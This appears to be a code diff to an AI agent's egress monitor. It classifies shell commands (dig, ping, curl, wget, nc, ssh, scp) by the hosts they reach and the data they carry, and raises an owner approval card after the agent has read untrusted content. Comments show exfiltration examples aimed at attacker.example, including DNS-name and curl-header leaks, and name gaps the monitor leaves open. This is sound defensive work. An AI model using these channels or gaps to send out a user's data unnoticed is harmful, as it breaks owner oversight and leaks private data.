@@ -691,10 +691,361 @@ export const gitConfigRunsCode = (args: readonly string[]): boolean => {
  */
 const URL_IN_COMMAND = /https?:\/\/[^\s'"`<>\\)]+/g;
 
-const shellDestinations = (args: Record<string, unknown>): string[] => {
+const literalUrlsInCommand = (args: Record<string, unknown>): string[] => {
   const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
   const command = [textValue(args.executable), ...commandArgs, commandScript(args)].join(' ');
   return [...new Set(command.match(URL_IN_COMMAND) ?? [])];
+};
+
+/**
+ * The programs whose argument is a name for the network to resolve, not a file to open.
+ *
+ * A name lookup is the cheapest exfiltration channel on any computer: the payload IS the name, it
+ * leaves through the resolver before anything answers, and it needs no reply and no listening
+ * service to succeed. `dig <the mailbox, base32>.attacker.example` was measured on this tree as
+ * zero destinations, zero bytes charged and no card, on a turn the floor had already marked
+ * tainted.
+ *
+ * The reachability tools are here for the same reason and not as an afterthought: `ping` resolves
+ * the name exactly as `dig` does, so closing one and leaving the other is not a bound, it is a
+ * change of spelling. The cost is stated in docs/design/ranked/CARD-AND-SHELL.md - on a tainted
+ * turn `ping -c1 8.8.8.8` now raises a card - and it is a card, not a refusal.
+ */
+const RESOLVING_EXECUTABLES = new Set([
+  'delv',
+  'dig',
+  'dog',
+  'drill',
+  'getent',
+  'host',
+  'kdig',
+  'mtr',
+  'nslookup',
+  'ping',
+  'ping6',
+  'resolvectl',
+  'systemd-resolve',
+  'tracepath',
+  'traceroute',
+  'traceroute6'
+]);
+
+/**
+ * Clients where every argument that names a host is an address the call would fetch - and which
+ * therefore ALWAYS write their address down, so one that does not is one this cannot read.
+ *
+ * The second half is the honest half of the shell bound, and it is the same set rather than a second
+ * one beside it because two lists of the same seven names drift. `curl -s "$U"`,
+ * `wget "$(cat url.txt)"` and every other address composed at run time are unreadable here and
+ * always will be - no static reader resolves a variable - and until now they were the quietest hole
+ * in the file: the fetch tainted the turn, then no destination was found, so no card was raised and
+ * no bytes were charged, and the turn went on being judged as though nothing had left. An unreadable
+ * destination is the strongest case for asking the owner, not the weakest, so these raise the card
+ * the address would have raised.
+ *
+ * `git`, `gh` and the package managers are deliberately absent. Their remote lives in the
+ * repository's or the installation's own configuration rather than in the command, so requiring an
+ * address of them would card `git pull`, `gh api /repos/x/y` and `pip install requests` on every
+ * tainted turn - the ordinary work of this product - to catch a shape none of them is used in.
+ * `git clone "$U"` is the gap that leaves, and it is stated rather than papered over.
+ */
+const FETCH_CLIENT_EXECUTABLES = new Set([
+  'aria2c',
+  'curl',
+  'http',
+  'httpie',
+  'wget',
+  'youtube-dl',
+  'yt-dlp'
+]);
+
+/**
+ * Clients that open one connection, to the first host their arguments name.
+ *
+ * Only the first, because everything after it is the remote command or the payload: the tokens in
+ * `ssh host.example cat notes.txt` after `host.example` run on the far end, and reading them as
+ * addresses would put `notes.txt` on the card as somewhere data was going.
+ */
+const CONNECTING_EXECUTABLES = new Set(['ftp', 'nc', 'ncat', 'netcat', 'socat', 'ssh', 'telnet']);
+
+/**
+ * Copiers where a remote end is written as a remote end.
+ *
+ * `scp`, `sftp` and `rsync` tell local from remote by the `:` or the `@`, which is a fact about
+ * their argument grammar rather than a guess about it - so `scp notes.txt user@x.example:/tmp/`
+ * names one destination and not two.
+ */
+const REMOTE_SPEC_EXECUTABLES = new Set(['rsync', 'scp', 'sftp']);
+
+/**
+ * Options whose value is something on this computer, so the token after them names no address.
+ *
+ * Case matters and the existing spelling test says why: curl's `-D` writes the response headers to
+ * a local file and `-d` sends a body, `-T` uploads and `-t` sets a telnet option. Long forms are
+ * matched lowercased, short forms exactly, which is how `sendsDataOverNetwork` above already reads
+ * the same argument lists.
+ *
+ * This list is the PRECISION and not the safety, in the direction that matters: a spelling missing
+ * from it means a local filename is offered to the address reader, which at worst costs one card on
+ * a turn that has already read untrusted content. A spelling wrongly ON it would hide an address,
+ * so nothing is here whose value can be one - `-x/--proxy`, `--url`, `--resolve` and `--connect-to`
+ * all name somewhere on the network and are all deliberately absent.
+ */
+const LOCAL_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
+  curl: new Set([
+    '-o',
+    '-D',
+    '-c',
+    '-K',
+    '-E',
+    '-T',
+    '-w',
+    '-X',
+    '-m',
+    '-C',
+    '-Y',
+    '-y',
+    '-z',
+    '--output',
+    '--dump-header',
+    '--cookie-jar',
+    '--config',
+    '--cert',
+    '--key',
+    '--cacert',
+    '--capath',
+    '--upload-file',
+    '--write-out',
+    '--request',
+    '--netrc-file',
+    '--trace',
+    '--trace-ascii',
+    '--stderr',
+    '--max-time'
+  ]),
+  wget: new Set([
+    '-O',
+    '-o',
+    '-a',
+    '-P',
+    '-i',
+    '-t',
+    '-T',
+    '-w',
+    '-Q',
+    '--output-document',
+    '--output-file',
+    '--append-output',
+    '--directory-prefix',
+    '--input-file',
+    '--load-cookies',
+    '--save-cookies',
+    '--ca-certificate',
+    '--ca-directory',
+    '--certificate',
+    '--private-key',
+    '--post-file',
+    '--body-file',
+    '--config'
+  ]),
+  ssh: new Set(['-i', '-F', '-E', '-S', '-o']),
+  scp: new Set(['-i', '-F', '-E', '-S', '-o']),
+  sftp: new Set(['-i', '-F', '-E', '-S', '-o', '-b']),
+  rsync: new Set(['-e', '--rsh', '--exclude-from', '--files-from', '--log-file', '--password-file'])
+};
+
+/**
+ * Options whose value is material the request carries without any of it appearing in the address.
+ *
+ * This is the second half of the shell hole and the one that needed a decision rather than a list.
+ * `curl -H "X-Data: <the mailbox>" https://docs.example.com/` goes to a host the turn legitimately
+ * read, so the address costs two bytes and raises nothing, while the payload rides out in a header
+ * that nothing here was measuring. HTTP does not care which part of a request the bytes are in and
+ * neither does the recipient, so neither does the budget: these values are attached to the address
+ * before it is judged, and `classifyDestination` charges them exactly as it charges a path segment.
+ *
+ * Ordinary work stays ordinary because the charge is against the owner's own corpus rather than
+ * against a threshold on the flag. Measured: `curl -H 'Accept: application/json'` on an address a
+ * search handed the model costs 30 of the 1,024 bytes a tainted turn may spend and raises nothing -
+ * thirty-four such requests before anybody is asked - while a 96-byte payload in the same header
+ * costs 107 and raises the card on the first one. Carding on the presence of `-H` would have
+ * stopped both, and a bound that interrupts real work is one the owner turns off.
+ */
+const CARRIED_VALUE_OPTIONS: Record<string, ReadonlySet<string>> = {
+  curl: new Set([
+    '-H',
+    '-d',
+    '-F',
+    '-b',
+    '-A',
+    '-e',
+    '-u',
+    '--header',
+    '--data',
+    '--data-ascii',
+    '--data-binary',
+    '--data-raw',
+    '--data-urlencode',
+    '--form',
+    '--form-string',
+    '--cookie',
+    '--user-agent',
+    '--referer',
+    '--user',
+    '--url-query'
+  ]),
+  wget: new Set([
+    '--header',
+    '--post-data',
+    '--body-data',
+    '--user',
+    '--password',
+    '--user-agent',
+    '--referer'
+  ])
+};
+
+const IPV4_LITERAL = /^\d{1,3}(?:\.\d{1,3}){3}$/;
+/**
+ * A dotted name with a top-level label that could be one: two or more characters, letter first.
+ *
+ * Anchored, and that is what does the work. Every non-address a fetch client is handed - a header
+ * value, a form field, an httpie `name=John Smith`, a `%{http_code}` format string - fails on the
+ * anchors, so no separate refusal for the shapes a shell composes at run time is needed and none is
+ * kept: one was, and it cost precision rather than buying safety. `curl 'attacker.example/?q=a b'`
+ * came back as an address this could not read, charged four bytes for the word `curl`, while the
+ * host and the payload were both written out in front of it.
+ *
+ * `localhost` is named because it is the one host in daily use here with no dot in it, and the
+ * alternative was a card in front of `curl localhost:3000/health` on every tainted turn. It is not
+ * a way out of anything: `classifyDestination` sends loopback and the private ranges to
+ * `isPublicHttpUrl`, which is where somewhere-data-cannot-go is decided for every tool at once.
+ */
+const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;
+
+/**
+ * The request one command argument would make, as an address, or '' when it names none.
+ *
+ * An address in a shell command is not a URL: it is written without a scheme (`curl x.example/q`),
+ * with a user in front of it (`ssh me@x.example`), with a port after it (`nc x.example 443`) or
+ * with a remote path after a colon (`scp f me@x.example:/tmp`). All four put the name first, so the
+ * name is taken from the front and whatever follows is kept as the path - the part the budget then
+ * charges. The scheme is filled in as https because `classifyDestination` reads only http and https
+ * and neither the charge nor the host judgement depends on which of the two it is.
+ */
+const addressFromArgument = (raw: string): string => {
+  const token = raw.replace(/^['"]+|['"]+$/g, '').trim();
+  if (!token) return '';
+  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(token)) return /^https?:\/\//i.test(token) ? token : '';
+  const body = token.slice(token.lastIndexOf('@') + 1);
+  const cut = body.search(/[/?#]/);
+  const authority = cut < 0 ? body : body.slice(0, cut);
+  const tail = cut < 0 ? '' : body.slice(cut);
+  const [host = '', port = ''] = authority.split(':');
+  if (!(IPV4_LITERAL.test(host) || DOTTED_NAME.test(host))) return '';
+  try {
+    return new URL(`https://${host}${/^\d+$/.test(port) ? `:${port}` : ''}${tail || '/'}`).href;
+  } catch {
+    return '';
+  }
+};
+
+/**
+ * The option this argument is and the value it carries, when the option is one of `table`.
+ *
+ * `takesNext` is what separates `--header 'X: y'` from `--header=X: y`: the first eats the token
+ * after it and the second does not, and reading them the same way either swallowed the address or
+ * put the whole `--header=X: y` on the card as the option's name.
+ */
+const optionValueAt = (
+  commandArgs: readonly string[],
+  index: number,
+  table: ReadonlySet<string> | undefined
+): { option: string; value: string; takesNext: boolean } | null => {
+  const argument = commandArgs[index] ?? '';
+  if (!table) return null;
+  const joined = argument.indexOf('=');
+  if (argument.startsWith('--') && joined > 0) {
+    const option = argument.slice(0, joined);
+    return table.has(option.toLowerCase())
+      ? { option, value: argument.slice(joined + 1), takesNext: false }
+      : null;
+  }
+  const named = argument.startsWith('--') ? table.has(argument.toLowerCase()) : table.has(argument);
+  // `-so page.html` is `-s` and `-o` written together, and only the last letter of a cluster takes
+  // the value. Without this the filename came back as a host and carded an ordinary download.
+  const clustered =
+    !argument.startsWith('--') &&
+    argument.startsWith('-') &&
+    argument.length > 2 &&
+    table.has(`-${argument.slice(-1)}`);
+  if (!(named || clustered)) return null;
+  return {
+    option: clustered ? `-${argument.slice(-1)}` : argument,
+    value: commandArgs[index + 1] ?? '',
+    takesNext: true
+  };
+};
+
+/**
+ * Every address one resolved command would reach, and the material it would carry there.
+ *
+ * The addresses and the carried material come back as one list of URLs because that is what the
+ * budget measures and what the card names: `classifyDestination` charges a request by its host and
+ * by the pieces of it the model composed, and a header value is a piece the model composed. The
+ * address is left byte-identical when the command carries nothing extra, which is what keeps the
+ * whole-address credit in `egress.ts` working for a link the harness handed over.
+ */
+const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]): string[] => {
+  const name = executable.toLowerCase();
+  const local = LOCAL_VALUE_OPTIONS[name];
+  const carriedTable = CARRIED_VALUE_OPTIONS[name];
+  const skip = new Set<number>();
+  const carried: Array<[string, string]> = [];
+  commandArgs.forEach((_argument, index) => {
+    const localOption = optionValueAt(commandArgs, index, local);
+    if (localOption?.takesNext) skip.add(index + 1);
+    const carriedOption = optionValueAt(commandArgs, index, carriedTable);
+    if (!carriedOption) return;
+    if (carriedOption.takesNext) skip.add(index + 1);
+    if (carriedOption.value) carried.push([carriedOption.option, carriedOption.value]);
+  });
+  const candidates = commandArgs
+    .map((argument, index) => (skip.has(index) || /^[-+]/.test(argument) ? '' : argument))
+    .filter(Boolean);
+  const resolve = (tokens: readonly string[]): string[] =>
+    tokens.map(addressFromArgument).filter(Boolean);
+  let addresses: string[] = [];
+  // `dig @1.1.1.1 <name>` asks a resolver of the model's choosing, and that resolver is where the
+  // name goes; `addressFromArgument` takes the host from after the last `@` for exactly this and
+  // for `ssh me@host`, so the server needs no branch of its own.
+  if (FETCH_CLIENT_EXECUTABLES.has(name) || RESOLVING_EXECUTABLES.has(name))
+    addresses = resolve(candidates);
+  else if (CONNECTING_EXECUTABLES.has(name)) addresses = resolve(candidates).slice(0, 1);
+  else if (REMOTE_SPEC_EXECUTABLES.has(name))
+    addresses = resolve(candidates.filter((argument) => /[:@]/.test(argument)));
+  if (!addresses.length)
+    return FETCH_CLIENT_EXECUTABLES.has(name)
+      ? // Carded and charged as the unreadable address it is. What goes back is the token the
+        // command actually wrote plus whatever it carries, so the bytes charged are bytes that are
+        // really present rather than a number invented here, and `classifyDestination` reports it
+        // through its own unparseable branch.
+        [
+          [
+            commandArgs.find((argument) => /[$`]/.test(argument)) || name,
+            ...carried.map(([, value]) => value)
+          ].join(' ')
+        ]
+      : [];
+  if (!carried.length) return addresses;
+  const [first = '', ...rest] = addresses;
+  try {
+    const url = new URL(first);
+    for (const [option, value] of carried) url.searchParams.append(option, value);
+    return [url.href, ...rest];
+  } catch {
+    return addresses;
+  }
 };
 
 /**
@@ -704,6 +1055,12 @@ const shellDestinations = (args: Record<string, unknown>): string[] => {
  * judge it, and the turn's novelty budget asks the same question in order to charge it, and an
  * address only one of them knows about is either an unjudged request or an unpaid one. A batch is
  * twenty-four actions wearing one action name, so the navigate inside one is here too.
+ *
+ * For `shell` this reads the commands the call really runs, wrappers and interpreter off, and not
+ * only the http(s) addresses spelled out in it. The literal scan stays alongside because it is the
+ * one reader that works on a shape `effectiveCommands` cannot resolve at all - a script handed to
+ * an interpreter as a file, an address in a program this has never heard of - and the two are
+ * unioned rather than chosen between.
  */
 export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
   if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
@@ -714,7 +1071,16 @@ export const callDestinations = (name: string, args: Record<string, unknown>): s
         ? args.actions.map((step) => textValue((step as { url?: unknown } | null)?.url))
         : [])
     ].filter(Boolean);
-  if (name === 'shell' || name === 'desktop_launch') return shellDestinations(args);
+  if (name === 'shell' || name === 'desktop_launch') {
+    const resolved = effectiveCommands(args).flatMap(commandAddresses);
+    // A literal the resolved list already accounts for is the same request, not a second one:
+    // `https://x/` and the `https://x/?…` that carries the header are one call and must be one
+    // verdict, or the host is charged twice and named twice on the card.
+    const spelled = literalUrlsInCommand(args).filter(
+      (url) => !resolved.some((address) => address.startsWith(url))
+    );
+    return [...new Set([...resolved, ...spelled])];
+  }
   return [];
 };
 
@@ -834,10 +1200,18 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
    * the brief with no card either. The address scan stays, because it catches the shapes this
    * cannot resolve; it is no longer the only thing looking past the wrapper.
    */
+  /*
+   * The literal scan and not `callDestinations`, and the difference is the question rather than an
+   * oversight. That one asks where a request goes, so it reads a name lookup and a bare host as the
+   * destinations they are; this one asks whether somebody else's bytes came back into the window,
+   * and a `ping` sends far more than it returns. Widening this to the same reader would mark a turn
+   * as having read untrusted content because it checked whether a host was reachable, and taint is
+   * the input to every other floor in this file.
+   */
   if (
     args.network === true ||
     effectiveCommands(args).some(fetchesRemoteContent) ||
-    shellDestinations(args).length > 0
+    literalUrlsInCommand(args).length > 0
   )
     return 'network command output';
   // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
